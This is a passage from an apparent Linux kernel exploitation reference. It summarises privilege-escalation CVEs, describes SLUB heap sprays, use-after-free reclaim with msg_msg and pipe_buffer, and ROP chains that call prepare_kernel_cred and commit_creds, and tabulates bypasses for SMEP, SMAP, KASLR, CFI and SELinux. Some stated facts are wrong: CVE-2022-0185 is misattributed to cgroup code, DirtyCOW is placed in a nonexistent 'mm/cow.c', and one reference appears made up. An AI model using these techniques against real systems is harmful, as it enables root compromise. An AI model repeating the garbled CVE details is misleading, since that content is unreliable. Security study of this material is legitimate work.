    // 2. Copy-up creates: /upper/bin/sudo (still setuid, but SELinux: user_home_t)
    // 3. Attacker can modify the upper layer copy (it's on a writable filesystem)
    // 4. Modified setuid binary runs as root → full LPE
}
```

**Patch**: `f9485` — Fixed credential handling in `ovl_copy_up()` to use proper credentials.

#### CVE-2022-0185 — Integer Overflow in cgroup/proc

**Component**: `kernel/cgroup/cgroup-v1.c` + `fs/proc/base.c`
**Type**: Integer overflow leading to heap overflow
**Impact**: Local privilege escalation, container escape

The `parse_cgroup_root_flags()` function did not properly validate the `nr_cgrp` and `nr_pid` counts when loading cgroup/pid arrays. An attacker could craft input that caused `nr * sizeof(u32)` to overflow, resulting in a small allocation followed by a large `copy_from_user()` — a classic integer overflow leading to heap overflow.

```c
// Integer overflow in cgroup parsing (CVE-2022-0185)
// Simplified pseudocode:
static ssize_t cgroup_procs_write(struct kernfs_open_file *of, char *buf) {
    // Parse pid count from user input
    unsigned int nr = 0;
    // ... parsing loop ...
    // nr comes from user, can be very large
    
    // Integer overflow: nr * sizeof(pid_t) wraps to small value
    pid_t *pids = kvmalloc(nr * sizeof(pid_t), GFP_KERNEL);
    // kvmalloc(nr * sizeof(pid_t)) where nr = 0x20000001
    // nr * 4 = 0x80000004 → wraps to 4 on 32-bit
    // allocates only 4 bytes
    
    // Then copy_from_user writes nr * sizeof(pid_t) bytes → massive heap overflow
    copy_from_user(pids, user_pids, nr * sizeof(pid_t));
}
```

**Patch**: `2505a95` — Added overflow checks to `nr * sizeof(pid_t)` computations.

#### CVE-2021-33909 — seq_file Heap Overflow

**Component**: `fs/seq_file.c`
**Type**: Heap overflow via truncated sprintf
**Impact**: Local privilege escalation

The `seq_file` interface had a bug where `seq_puts()` or `seq_printf()` could write past the allocated buffer when a single call produced more output than the remaining buffer space. If the formatted string was longer than the buffer, it would overflow into adjacent heap objects.

```c
// seq_file overflow pattern (CVE-2021-33909)
// seq_file allocates buffer of PAGE_SIZE
// If a single seq_printf() call outputs more than the remaining space:
//
// size_t count = m->size - m->count;  // space remaining
// int len = snprintf(m->buf + m->count, count, "%s\n", very_long_string);
// if (len >= count) {
//     m->count = m->size;  // marks buffer as full
//     return -1;            // triggers realloc
// }
// BUG: on realloc, the overflowed bytes are NOT cleaned up
// → heap corruption with attacker-controlled data from snprintf output
```

**Patch**: `8403296` — Fixed `seq_file` to properly detect and handle overflow conditions.

#### CVE-2023-32233 — Netfilter nf_tables UAF (Different Vector)

**Component**: `net/netfilter/nf_tables_api.c`
**Type**: Use-after-free in nft_verdict_init
**Impact**: Local privilege escalation

A different UAF vector in `nf_tables` was triggered when rules referenced chains that could be freed concurrently. The `NFT_MSG_DESTROY` operation would free a chain and its rules, but existing rules in other chains that jumped to the destroyed chain would still hold stale pointers.

```c
// CVE-2023-32233 exploitation pattern
// 1. Create nft_table with base chain A
// 2. Create regular chain B with a rule that jumps to chain C
// 3. Create chain C with references
// 4. Trigger nft_delchain(C) while chain B's rule still references C
// 5. Race between chain deletion and packet processing
// 6. UAF → controlled data → arbitrary kernel R/W → root
//
// Key: nft_chain_del() decrements refcount but doesn't wait for
// existing rule references to be dropped → use-after-free
```

#### CVE-2019-18683 — V4L2 Video Driver Race

**Component**: `drivers/media/platform/vivid/`
**Type**: Race condition (concurrent mmap/remap)
**Impact**: Local privilege escalation (via UAF)

The `vivid` test driver had a race condition between `mmap()` and `munmap()` of video buffers. Two threads racing `VIDIOC_REQBUFS` and `VIDIOC_DQBUF` could cause a use-after-free of the video buffer, which was allocated on the kernel heap.

```c
// vivid driver race (CVE-2019-18683)
// Thread A: VIDIOC_REQBUFS → frees old buffers, allocates new ones
// Thread B: VIDIOC_DQBUF → accesses freed buffer → UAF
//
// Protection: vb2_queue.lock should be held, but race window existed
// between buffer free and queue reinitialization
```

#### CVE-2019-13279 — ptrace UAF

**Component**: `kernel/ptrace.c`
**Type**: Use-after-free
**Impact**: Local privilege escalation / denial of service

A UAF caused by concurrent `ptrace()` operations on the same task. One thread could call `ptrace(PTRACE_GETREGS)` while another called `ptrace(PTRACE_DETACH)`, leading to `task->ptrace` being cleared while the first thread still accessed the traced task's credentials.

#### CVE-2020-14314 — ext4 OOB Read

**Component**: `fs/ext4/super.c`
**Type**: Out-of-bounds read
**Impact**: Information leak (kernel memory disclosure)

When mounting a crafted ext4 filesystem image, the `ext4_fill_super()` function would parse the group descriptor table without properly validating `s_desc_size`, leading to an OOB read beyond the buffer allocated for descriptors.

#### CVE-2020-25710 — BPF Verifier OOB Access

**Component**: `kernel/bpf/verifier.c`
**Type**: OOB access due to incorrect bounds tracking
**Impact**: Local privilege escalation

Another BPF verifier bounds tracking bug where the verifier incorrectly handled 32-bit subregister zero-extension. After a 32-bit operation, the verifier would sometimes fail to mark the upper 32 bits as zero, leading to an incorrect bounds range that allowed OOB memory access.

---

## 5. Kernel Exploitation Techniques

### 5.1 Heap Exploitation (SLAB/SLUB Allocator Attacks)

The Linux kernel uses the **SLUB allocator** (default) for most kernel heap allocations. SLUB organizes objects into **caches** (e.g., `kmalloc-64`, `kmalloc-1024`, `filp`, `msg_msg`), each containing **slabs** of one or more pages, divided into fixed-size objects.

**Key SLUB concepts for exploitation:**

```
┌────────────────────────────────────────────────┐
│                  Slab (2+ pages)                │
│  ┌──────┬──────┬──────┬──────┬──────┬──────┐  │
│  │ Obj0 │ Obj1 │ Obj2 │ Obj3 │ Obj4 │ Obj5 │  │
│  │ free │ free │alloc │ free │alloc │ free │  │
│  └──────┴──────┴──────┴──────┴──────┴──────┘  │
│  freelist → Obj0 → Obj1 → Obj3 → Obj5         │
│  (singly linked via first 8 bytes of object)   │
└────────────────────────────────────────────────┘
```

**SLUB freelist pointer embedding:** In SLUB, the free list pointer is stored inside the object itself (at offset 0, or at a randomized offset when `CONFIG_SLAB_FREELIST_RANDOMIZE` or `CONFIG_SLAB_FREELIST_HARDENED` is enabled).

#### Cross-Cache Attack

When the target object is in a dedicated cache (e.g., `filp`, `task_struct`), the attacker sprays objects from a more general cache (`kmalloc-N`) to overlap with freed target objects.

```c
// Cross-cache heap spray pattern
// Goal: Overlap freed target object with controlled data

// Step 1: Allocate many target objects to fill the slab
for (int i = 0; i < NUM_SPRAY; i++) {
    target_fds[i] = open("/dev/null", O_RDONLY); // allocates filp
}

// Step 2: Free specific target objects to create holes
close(target_fds[HOLE_INDEX]); // frees one filp object

// Step 3: Spray kmalloc-N objects to reclaim the freed slot
for (int i = 0; i < NUM_SPRAY; i++) {
    msgsnd(msgid[i], &msg, sizeof(msg), 0); // allocates msg_msg in kmalloc-N
}

// Step 4: Now msg_msg overlaps the freed filp
// Attacker controls msg_msg content → overlaps filp fields
// If filp had function pointers → RIP control
```

#### Freelist Pointer Corruption

SLUB hardened mode (`CONFIG_SLAB_FREELIST_HARDENED`) XORs freelist pointers with a random value and validates object alignment. However, with an OOB write of the right size, the freelist pointer can still be corrupted to point to a fake object.

```c
// Freelist pointer corruption (bypassing SLAB_FREELIST_HARDENED)
// The hardened freelist pointer is: XOR(ptr, random, &ptr)
// If we can write an arbitrary value at the freelist pointer location:
//
// Original: next = XOR(real_next, random, &next_loc)
// We write: next = XOR(fake_target, random, &next_loc) + correction
//
// On next allocation from this slab:
//   SLUB reads: fake_next = XOR(next, random, &next_loc)
//   = XOR(XOR(fake_target, random, &next_loc), random, &next_loc)
//   = fake_target  → allocation returns our controlled address
//
// Result: Next kmalloc from this cache returns arbitrary address
// → allocate at modprobe_path, cred, etc.
```

### 5.2 Stack-Based Kernel Exploits

The kernel stack is limited (16KB on x86-64 by default, `THREAD_SIZE_ORDER=2`). Stack-based exploits in the kernel differ from userspace because:

1. **No ASLR per-stack**: KASLR randomizes the kernel base, but stack locations are somewhat predictable relative to the `task_struct`.
2. **Stack canaries**: Present since Linux 4.15 (`CONFIG_STACKPROTECTOR`), but may be bypassed.
3. **No NX on kernel stack**: Actually, kernel stack pages ARE executable (this is changing with `CONFIG_VMAP_STACK`).

#### Kernel Stack Overflow Exploitation

```c
// Kernel stack overflow via VLA or large alloca
// Example: ioctl handler with unchecked size
static long vuln_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    unsigned long size;
    copy_from_user(&size, (void __user *)arg, sizeof(size));

    // BUG: size is user-controlled, can overflow kernel stack
    char buf[size];  // VLA allocation on kernel stack
    // Kernel stack is only 16KB — if size > 16KB, we overflow
    copy_from_user(buf, (void __user *)(arg + sizeof(size)), size);

    // Stack overflow → overwrites thread_info, saved registers, return address
}

// Exploitation:
// 1. Trigger stack overflow with size > THREAD_SIZE
// 2. Overwrite saved RIP on stack with ROP gadget address
// 3. Stack pivot to controlled data area
// 4. ROP chain: prepare_kernel_cred(0) → commit_creds(new_cred)
// 5. Return to userland with root privileges
```

#### Stack Pivot in Kernel

When the kernel stack is overflowed, the attacker typically needs to pivot the stack to a controlled area for a ROP chain:

```c
// Stack pivot gadget examples (from kernel .text):
// xchg rax, rsp ; ret      // pivot stack to rax
// mov rsp, rax ; ret       // pivot stack to rax
// push rsi ; pop rsp ; ret // pivot stack to rsi

// Common pivot strategy:
// 1. Overflow kernel stack, corrupting saved RIP with pivot gadget
// 2. Pivot to a controlled kernel heap object (msg_msg, pipe_buffer, etc.)
// 3. ROP chain on the fake stack:

uint64_t rop_chain[] = {
    pop_rdi_ret,           // pop rdi; ret
    0,                     // rdi = 0 (init_cred or NULL for prepare_kernel_cred)
    prepare_kernel_cred,   // prepare_kernel_cred(0)
    pop_rdx_ret,           // pop rdx; ret
    0,                     // rdx = 0
    pop_rsi_ret,           // pop rsi; ret (or mov rdi, rax;jmp)
    commit_creds,          // commit_creds(new_cred)
    swapgs_restore,        // swapgs; iretq sequence
    user_shellcode_addr,   // RIP of user shellcode
    USER_CS,               // CS
    user_stack_addr,       // RSP
    USER_RFLAGS,           // RFLAGS
    USER_SS,               // SS
};
```

### 5.3 Use-After-Free in Kernel

UAF is one of the most common and powerful kernel vulnerability classes. The exploitation pattern:

1. **Allocate** target object (e.g., `struct file`, `msg_msg`, `pipe_buffer`)
2. **Free** target object (trigger bug or normal free)
3. **Reallocate** freed slot with attacker-controlled data (heap spray)
4. **Access** stale pointer → use attacker-controlled data as kernel object

#### msg_msg UAF Pattern

`msg_msg` is one of the most popular spray objects because it offers fine-grained size control (64 bytes to 64KB) and attacker-controlled content.

```c
// msg_msg structure (simplified)
struct msg_msg {
    struct list_head m_list;     // 16 bytes (next, prev pointers)
    long m_type;                 // 8 bytes
    size_t m_ts;                 // 8 bytes — total message size
    // ... header total: ~48 bytes (depends on struct alignment)
    // followed by m_ts bytes of user-controlled data
    // For kmalloc-64: 64 - header_size bytes of controlled data
};

// UAF exploitation with msg_msg:
// Step 1: Allocate target object in kmalloc-256
for (int i = 0; i < NUM; i++) {
    msgsnd(qid[i], &msg, 256 - 48, 0);  // msg in kmalloc-256
}

// Step 2: Free target object (via vulnerability trigger)
// ... trigger bug that frees the target without clearing pointer

// Step 3: Reclaim with msg_msg
// Spray msg_msg in kmalloc-256 to overlap freed slot
msgsnd(reclaim_qid, &controlled_msg, 256 - 48, 0);

// Step 4: Use stale pointer — now points to our msg_msg
// If target was a struct with function pointers:
//   target->ops->ioctl()  →  controlled msg_msg data → RIP control

// Step 5: With RIP control, execute ROP chain
```

#### pipe_buffer UAF Pattern

`pipe_buffer` is another popular spray target. Each `pipe_buffer` is 40 bytes, fitting in `kmalloc-64`. The key attraction is that `pipe_buffer` contains an `ops` pointer (pointer to `pipe_buf_operations`), which is essentially a vtable.

```c
// pipe_buffer structure
struct pipe_buffer {
    struct page *page;                  // 8 bytes — pointer to struct page
    unsigned int offset, len;            // 8 bytes total
    const struct pipe_buf_operations *ops; // 8 bytes — FUNCTION TABLE POINTER
    unsigned int flags;
};

// pipe_buf_operations (vtable)
struct pipe_buf_operations {
    int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);
    void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
    // ... more function pointers
};

// Exploitation:
// 1. Allocate pipe_buffer objects via pipe()
// 2. Free via close() or splice bug
// 3. Reclaim with controlled data (msg_msg or second set of pipes)
// 4. When the kernel calls pipe_buffer->ops->release():
//    → reads ops pointer from our controlled data
//    → calls ops->release() → RIP control
// 5. ROP chain for privilege escalation
```

### 5.4 Race Conditions (Spinlocks, Mutexes)

Kernel race conditions exploit the concurrency of kernel operations across multiple CPUs or preemption points. Key primitives:

**Double Fetch**: User pointer is accessed twice — once for validation, once for use — and the user can modify the data between the two accesses.

```c
// Classic double-fetch pattern
static long vuln_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    struct my_struct __user *uarg = (struct my_struct __user *)arg;
    struct my_struct karg;
    size_t size;

    // First fetch: validate
    if (copy_from_user(&size, &uarg->size, sizeof(size)))
        return -EFAULT;
    if (size > MAX_SIZE)
        return -EINVAL;

    // <--- RACE WINDOW: user modifies uarg->size here via another thread --->

    // Second fetch: use (potentially different value)
    if (copy_from_user(&karg, uarg, size))  // size may now be > MAX_SIZE
        return -EFAULT;

    // Heap overflow if size was modified between checks
    buf = kmalloc(size, GFP_KERNEL);
}
```

**Mutex/Spinlock Race**: Two threads race to access shared data protected by a lock, but the lock is dropped/reacquired or missing entirely.

```c
// Spinlock race pattern
// Thread A:                           // Thread B:
lock(&data->lock);                    //
data->count = count_from_user();      //
unlock(&data->lock);                  //
                                      lock(&data->lock);
                                      // uses data->count, but Thread A
                                      // may have modified it without proper
                                      // synchronization
                                      process(data->count);
                                      unlock(&data->lock);

// Real example: CVE-2016-5195 (DirtyCOW)
// The COW path in mm/cow.c had a race window between:
//   1. Checking the page table entry (page is read-only)
//   2. Actually resolving the COW (allocating new page)
// During this window, madvise(DONTNEED) could discard the COW page,
// causing the write to hit the original page instead
```

**File lock race (FILELOCK)**: Various filesystem bugs where file lock state is modified without proper locking:

```c
// Pattern: locks_remove_posix() racing with fasync() or dup2()
// leads to UAF of file lock objects
```

### 5.5 Integer Overflows Leading to Heap Sizing Bugs

Integer overflows in size calculations are a classic source of kernel heap vulnerabilities. The pattern: an attacker-controlled size value is used in arithmetic that wraps, causing a small allocation followed by a large copy.

```c
// Integer overflow patterns in the kernel

// Pattern 1: Size multiplication overflow
static long alloc_array(struct file *filp, unsigned long count,
                         unsigned long elem_size) {
    // BUG: count * elem_size can overflow on 32-bit
    unsigned long total = count * elem_size;  // wraps to small value
    void *buf = kmalloc(total, GFP_KERNEL);   // small allocation
    copy_from_user(buf, user_ptr, count * elem_size);  // large copy → overflow
}

// Pattern 2: Size addition overflow
static long alloc_concat(struct file *filp, unsigned long len1,
                          unsigned long len2) {
    // BUG: len1 + len2 can overflow
    unsigned long total = len1 + len2 + 1;  // wraps to small value
    char *buf = kmalloc(total, GFP_KERNEL);
    copy_from_user(buf, user_ptr1, len1);     // fills small buffer
    copy_from_user(buf + len1, user_ptr2, len2); // overflow
}

// Pattern 3: Signed/unsigned confusion
static long alloc_buf(struct file *filp, int size) {
    // BUG: if size is negative (high bit set), comparison passes
    // but kmalloc treats it as huge unsigned value
    if (size < 0 || size > MAX_SIZE)
        return -EINVAL;
    // kmalloc with signed size cast to size_t
    void *buf = kmalloc(size, GFP_KERNEL);  // size is int, could be misinterpreted
}

// Pattern 4: Truncation on 64-bit
static long compat_ioctl(struct file *filp, unsigned int cmd,
                          unsigned long arg) {
    // BUG: 64-bit pointer truncated to 32 bits on compat path
    u32 size;
    copy_from_user(&size, (void __user *)arg, sizeof(size));
    // size is 32-bit, but kmalloc expects size_t (64-bit)
    void *buf = kmalloc(size, GFP_KERNEL);  // OK, but...
    copy_from_user(buf, (void __user *)(arg + sizeof(size)), user_specified_64bit_size);
    // If user-specified size > size, we have an overflow
}

// Exploitation of integer overflows:
// 1. Trigger integer overflow → small kmalloc allocation
// 2. Large copy_from_user overflows into adjacent heap objects
// 3. Corrupt adjacent object's metadata or data
// 4. Use corrupted object for arbitrary read/write
// 5. Escalate to root (overwrite cred, modprobe_path, etc.)
```

**Notable integer overflow CVEs:**
- CVE-2022-0185 — `nr * sizeof(pid_t)` overflow in cgroup
- CVE-2021-22555 — Size miscalculation in netfilter compat
- CVE-2021-33909 — `seq_file` buffer size truncation

---

## 6. Kernel Hardening

### 6.1 SMEP (Supervisor Mode Execution Prevention)

**Mechanism**: When the CPU is running at CPL 0 (Ring 0), SMEP prevents execution of instructions from user-space pages (those mapped with the U/S bit set in the page table entry). Any attempt to execute code from a user-accessible page while in kernel mode triggers a #PF (Page Fault) with error code bit 4 set.

- **CPU Feature**: `CR4.SMEP` (bit 20), introduced in Intel Ivy Bridge (2012)
- **Boot Parameter**: `nosmep` disables it
- **Bypass**: ROP chains that never execute user-space code; instead, chain kernel gadgets to achieve the same effect. Common bypass: `prepare_kernel_cred()` + `commit_creds()` via ROP.

```c
// SMEP bypass: Kernel ROP chain (no user-space code execution)
// Instead of: jmp user_shellcode (triggers SMEP #PF)
// Use:  ROP chain entirely in kernel .text

uint64_t rop[] = {
    pop_rdi,          0x0,               // rdi = 0
    prepare_kernel_cred,                  // rax = new cred struct ptr
    pop_rdx,          0x0,               // rdx = 0 (for some gadgets)
    mov_rdi_rax_jmp,  commit_creds,      // commit_creds(new_cred)
    kpti_trampoline,                     // swapgs_restore_regs_and_return_to_usermode
    0, 0,                               // padding (rax, rdi)
    user_rip,                            // return to user shell
    user_cs,
    user_rflags,
    user_sp,
    user_ss,
};
```

### 6.2 SMAP (Supervisor Mode Access Prevention)

**Mechanism**: When the CPU is running at CPL 0, SMAP prevents *any* access (read or write) to user-space pages without an explicit `stac` instruction to set the AC (Alignment Check) flag. This prevents kernel vulnerabilities from directly reading or writing user-space memory.

- **CPU Feature**: `CR4.SMAP` (bit 21), introduced in Intel Broadwell (2014)
- **Boot Parameter**: `nosmap` disables it
- **Implication**: Kernel code must use `copy_from_user()` / `copy_to_user()` (which set AC flag) instead of direct dereferencing of user pointers.
- **Bypass**: ROP chain that calls `copy_from_user()` / `copy_to_user()` indirectly, or uses kernel double-mapped pages to avoid user-space access entirely.

```c
// SMAP bypass techniques:
//
// 1. Use kernel-side copy functions in ROP chain:
//    push rdi ; stac ; ... ; clac ; ret
//    (gadgets that toggle AC flag)
//
// 2. Use kernel addresses for data instead of user addresses:
//    Overwrite modprobe_path (kernel address, no SMAP issue)
//    Overwrite core_pattern (kernel address)
//
// 3. Use physmap mapping:
//    The physmap maps all physical memory linearly
//    A user page at physical addr X is accessible at PAGE_OFFSET + X
//    → access user data via kernel-mapped physmap alias
//
// 4. KPTI bypass (see below): if KPTI is disabled,
//    user pages remain mapped in kernel page tables
```

### 6.3 KASLR (Kernel Address Space Layout Randomization)

**Mechanism**: Randomizes the base address of the kernel text, data, and modules at boot time. Without KASLR, the kernel is always loaded at a fixed address (e.g., `0xffffffff81000000`), making ROP/JOP attacks trivial.

- **Boot Parameter**: `nokaslr` disables; `kaslr` enables
- **Entropy**: ~20-30 bits depending on kernel version and `CONFIG_RANDOMIZE_BASE`
- **Linux**: `CONFIG_RANDOMIZE_MEMORY` also randomizes the physmap, vmalloc, and vmemmap ranges
- **Bypass**:
  1. **Information leak**: Read `/proc/kallsyms` (if `kptr_restrict=0`), `dmesg` (if `dmesg_restrict=0`)
  2. **Kernel pointer leak**: Various `/sys` and `/proc` entries leak kernel addresses
  3. **Side channels**: TLB timing, BTB (Branch Target Buffer) collisions
  4. **Heap object leak**: UAF/OOB read to leak kernel pointers from freed objects

```
// KASLR offset example:
// Without KASLR:  kernel text at 0xffffffff81000000
// With KASLR:     kernel text at 0xffffffff81000000 + random_offset
//                 where random_offset is 0..2^30 (aligned to 2MB)
//
// Module region: randomized separately
// vmalloc region: randomized
// physmap region: randomized
// vmemmap region: randomized
```

### 6.4 KPTI (Kernel Page Table Isolation)

**Mechanism**: Also known as KAISER. Separates kernel and user page tables to mitigate Meltdown (CVE-2017-5754) class attacks. Without KPTI, the kernel page tables include user-space mappings (marked with NX and SMAP), allowing speculative execution to read user-accessible pages.

With KPTI:
- **User page table**: Only maps user-space + kernel entry/exit trampolines (minimal kernel mapping)
- **Kernel page table**: Maps both kernel and user space (user pages still subject to SMAP)

- **Performance Cost**: Every syscall/interrupt requires a page table switch (CR3 reload + TLB flush), costing ~5-30% depending on workload
- **Boot Parameter**: `nopti` disables; `pti=on` forces enable
- **Bypass**: Limited; KPTI effectively prevents Meltdown-type side channels. Attackers must find other information leaks.

```c
// KPTI CR3 switch in syscall entry (entry_SYSCALL_64)
// Entry: switch CR3 to kernel page table
//   mov rdi, cr3
//   or rdi, PTI_USER_PGTABLE_AND_PCID_MASK
//   mov cr3, rdi    // switch to kernel page table
//   ...
//   // execute syscall handler
//   ...
// Exit: switch CR3 to user page table
//   mov rdi, cr3
//   and rdi, ~PTI_USER_PGTABLE_AND_PCID_MASK
//   mov cr3, rdi    // switch to user page table
//   // iretq back to user space
```

### 6.5 Stack Canaries in Kernel

**Mechanism**: GCC's `-fstack-protector-strong` (enabled by default since Linux 5.0) inserts canary values on the kernel stack between local variables and the saved return address. The canary is checked on function return; if corrupted (by a buffer overflow), the kernel panics.

```c
// Kernel stack canary layout:
// ┌──────────────────────┐
// │  local variables     │  ← buffer overflow writes upward
// │  ...                 │
// │  char buf[N]        │
// ├──────────────────────┤
// │  CANARY (8 bytes)    │  ← random value from irq_stack_ptr or per-CPU
// ├──────────────────────┤
// │  saved RBP           │
// │  saved RIP           │  ← target of overflow
// └──────────────────────┘

// Canary value: per-task random value stored in task_struct->stack_canary
// Verified on function return:
//   if (canary != __stack_chk_guard) panic("stack-protector: Kernel stack is corrupted in: %pB\n", __builtin_return_address(0));
```

- **Bypass Techniques**:
  1. **Information leak**: Read canary value via OOB read or UAF before overflowing
  2. **Partial overwrite**: Overwrite only the lower bytes (if canary MSB is null byte `\x00`, partial overwrite of 1-2 bytes may be feasible)
  3. **Format string**: Kernfs format string bugs can leak canaries
  4. **Direct kernel read**: Read `task_struct->stack_canary` from a known kernel address

### 6.6 Kernel CFI (Control Flow Integrity)

**Mechanism**: Kernel CFI ensures that indirect function calls (via function pointers) only jump to valid function entry points. Implemented via Clang/LLVM's `-fsanitize=cfi` since Linux 5.13.

**Types**:
- **Forward-edge CFI**: Validates calls through function pointers (`call [rax]` must target a valid function)
- **Backward-edge CFI**: Validates return addresses (return must go to a valid call site)

```c
// CFI implementation (simplified)
// Before each indirect call, Clang inserts:
//   if (typeid(expected_type) != typeid(actual_target)) __cfi_check_fail();
//
// Example:
void (*fn_ptr)(void) = some_function_pointer;
// CFI inserts:
//   if (!cfi_type_match(fn_ptr, expected_type_id))
//       __cfi_check_fail(fn_ptr, expected_type_id);
fn_ptr();

// Effective CFI types in kernel:
// - CONFIG_CFI_CLANG: LLVM-based CFI (arm64, x86)
// - CONFIG_SHADOW_CALL_STACK: Return address protection (arm64)
// - kCFI: Kernel CFI patchset (proposed for mainline)
```

- **Bypass**: Attackers must either:
  1. Find a valid function pointer of the correct type to call (type confusion)
  2. Use a different attack primitive (data-only attacks, like overwriting `modprobe_path` or `cred` structure)
  3. Exploit CFI verification gaps (incomplete coverage of all indirect calls)

### 6.7 SELinux / AppArmor (LSM Hardening)

**SELinux** and **AppArmor** are Linux Security Modules (LSMs) that enforce mandatory access control (MAC) policies. While not Ring 0-specific protections, they constrain the *impact* of Ring 0 exploits.

**SELinux**:
- Enforces type enforcement (TE) policies: every process and object has a security context
- A process running as `unconfined_u:unconfined_r:unconfined_t` can still be exploited in Ring 0, but a confined process (`system_u:system_r:httpd_t`) has limited capabilities
- **Key**: Even with Ring 0 code execution, if SELinux is in enforcing mode, the exploit must also bypass SELinux to perform privileged operations

**AppArmor**:
- Profile-based MAC: each profile specifies file access, capabilities, and network rules
- Simpler than SELinux but still constrains exploit impact

```c
// SELinux bypass in kernel exploits:
//
// Method 1: Overwrite SELinux enforcing flag
//   if (selinux_is_enabled()) {
//       // Overwrite selinux_enforcing to 0
//       *(int *)SELINUX_ENFORCING_ADDR = 0;
//   }
//
// Method 2: Change current process context
//   struct cred *cred = prepare_kernel_cred(NULL);
//   // LSM label inherited from init_cred (unconfined)
//   commit_creds(cred);
//
// Method 3: Disable SELinux via /sys/fs/selinux/disable
//   write(fd, "1", 1); // requires root
//
// Method 4: Load a permissive policy module
//   // Complex, requires CAP_MAC_ADMIN
//
// Modern kernels: selinux_enforcing is in .rodata after 5.6+
// → Cannot be simply overwritten; must use other techniques
```

### 6.8 Kernel Address Space Layout Randomization (KASLR Details)

Beyond basic text randomization, modern Linux implements:

| Region | Randomization | Config Option |
|---|---|---|
| Kernel text | ~22 bits entropy | `CONFIG_RANDOMIZE_BASE` |
| Kernel modules | Separate random region | `CONFIG_RANDOMIZE_BASE` |
| vmalloc | Random base | `CONFIG_RANDOMIZE_MEMORY` |
| vmemmap | Random base | `CONFIG_RANDOMIZE_MEMORY` |
| physmap | Random base | `CONFIG_RANDOMIZE_MEMORY` |
| Direct map | Random offset | `CONFIG_RANDOMIZE_MEMORY` |

**Measured boot and KASLR verification**: Some systems use TPM-measured boot to verify kernel integrity, making KASLR bypass + exploitation detectable.

### 6.9 Additional Hardening Mechanisms

| Mechanism | Description | Config |
|---|---|---|
| **STACKLEAK** | Erases kernel stack on syscall return, preventing info leaks from stale stack data | `CONFIG_GCC_PLUGIN_STACKLEAK` |
| **RANDSTRUCT** | Randomizes struct field layout, preventing structure-based exploits | `CONFIG_RANDSTRUCT` |
| **INIT_ON_ALLOC** | Zeroes newly allocated heap memory (`init_on_alloc=1`) | `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` |
| **INIT_ON_FREE** | Zeroes freed heap memory (`init_on_free=1`) | `CONFIG_INIT_ON_FREE_DEFAULT_ON` |
| **HARDENED_USERCOPY** | Validates size/pointer in `copy_to_user`/`copy_from_user` | `CONFIG_HARDENED_USERCOPY` |
| **FORTIFY_SOURCE** | Runtime buffer overflow detection for `memcpy()`, `strcpy()`, etc. | `CONFIG_FORTIFY_SOURCE` |
| **SLUB HARDENED** | Freelist pointer encryption, object validation | `CONFIG_SLAB_FREELIST_HARDENED` |
| **PAGE_TABLE_CHECK** | Detects page table corruption | `CONFIG_PAGE_TABLE_CHECK` |
| **KFENCE** | Kernel memory sanitizer (probabilistic UAF detection) | `CONFIG_KFENCE` |
| **KASAN** | Kernel Address Sanitizer | `CONFIG_KASAN` |
| **UBSAN** | Undefined Behavior Sanitizer | `CONFIG_UBSAN` |
| **LOCKDEP** | Lock dependency validator (detects deadlocks) | `CONFIG_LOCKDEP` |

---

## Hardening Mechanism Bypass Summary

| Hardening | Primary Bypass | Secondary Bypass |
|---|---|---|
| SMEP | Kernel ROP | JOP, KROP |
| SMAP | `stac`/`clac` gadgets; physmap alias | Data-only attacks (modprobe_path overwrite) |
| KASLR | Info leak (`/proc`, `/sys`, OOB read) | Side channels (TSX, TLB) |
| KPTI | Not directly bypassable | Requires info leak in kernel context |
| Stack canary | Info leak via OOB/UAF | Partial overwrite bypassing null byte |
| CFI | Type confusion | Data-only attacks (cred overwrite) |
| SELinux | Set enforcing=0 (legacy) | Change process context; use `init_cred` |
| SLUB hardened | Freelist pointer corruption with XOR | Cross-cache attack |
| INIT_ON_ALLOC | N/A (doesn't prevent UAF) | UAF via type confusion |
| INIT_ON_FREE | Nullify freed content (more resistant) | Cross-cache with controlled allocation timing |

---

## Exploitation Primitives Summary

| Primitive | Typical Source | Use |
|---|---|---|
| **Arbitrary kernel read** | OOB read, UAF read | Defeat KASLR, leak canaries |
| **Arbitrary kernel write** | OOB write, UAF write, type confusion | Overwrite `cred`, `modprobe_path`, `core_pattern` |
| **Limited OOB write (heap)** | Heap overflow, freelist corruption | Corrupt adjacent object metadata |
| **Type confusion** | UAF with object replacement | Get function pointer control → RIP |
| **Double-free** | Race condition in free path | Freelist corruption → arbitrary alloc |
| **NULL pointer deref** | Missing NULL check | If `mmap(0)` is allowed → controlled page at address 0 |
| **Uninitialized data** | Missing zeroing of kernel structs | Info leak (KASLR bypass) |

---

## References

1. Love, R. "Linux Kernel Development." Addison-Wesley, 3rd Edition, 2010.
2. Corbet, J., Rubini, A., Kroah-Hartman, G. "Linux Device Drivers." O'Reilly, 2005.
3. Intel. "Intel 64 and IA-32 Architectures Software Developer's Manual." Volume 3A: System Programming Guide — IDT, TSS, paging, SMEP/SMAP.
4. AMD. "AMD64 Architecture Programmer's Manual Volume 2." System Programming — SYSCALL/SYSRET, CPL, MSR handling.
5. Shacham, H. "The Geometry of Innocent Flesh on the Bone: Return-Oriented Programming." CCS, 2007.
6. Abadi, M., et al. "Control-Flow Integrity." CCS, 2005.
7. NIST. "National Vulnerability Database." CVE entries: CVE-2016-5195 (Dirty COW), CVE-2022-0847 (Dirty Pipe), CVE-2017-1000364 (Stack Clash), CVE-2021-22555, CVE-2020-8835, CVE-2016-8655.
8. Pawlicki, A., et al. "STACKDETECT: Automatic Stack Clash Detection." AsiaCCS, 2018.
9. Dullien, T. "A Brief History of Linux Kernel Exploitation." OffensiveCon, 2020.
10. KASLR original paper: Team, P. "KASLR: Kernel Address Space Layout Randomization." 2005.

---

*This document was prepared for security research and educational purposes. All CVE information is sourced from public vulnerability databases and security research publications.*